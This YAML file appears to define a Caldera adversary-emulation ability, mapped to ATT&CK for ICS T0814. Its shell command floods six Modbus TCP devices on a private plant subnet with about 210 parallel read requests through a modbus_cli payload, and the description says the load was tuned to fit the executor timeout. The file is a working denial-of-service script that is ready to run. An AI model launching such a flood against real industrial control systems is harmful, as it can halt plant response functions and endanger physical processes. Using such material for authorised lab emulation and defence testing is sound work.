---

- id: f6a7b8c9-6666-6666-6666-000000000004
  name: Modbus - Denial of Service Flood
  description: |
    Rapid read requests against all in-plant Modbus TCP devices. Reduced parallelism
    versus the original (200×6 background loops) so the ability finishes within the
    Caldera executor timeout while still generating measurable load.
  tactic: inhibit-response-function
  technique_id: T0814
  technique_name: Denial of Service
  executors:
  - platform: linux
    name: sh
    command: |
      set +e
      for j in 10 11 12 13 14 15; do
        for i in $(seq 1 35); do
          ./modbus_cli "192.168.95.$j" --port 502 read_ir 1 2 2>/dev/null &
        done
      done
      wait
      set -e
      echo "DOS_FLOOD_COMPLETE"
    payloads:
    - modbus_cli
    timeout: 300
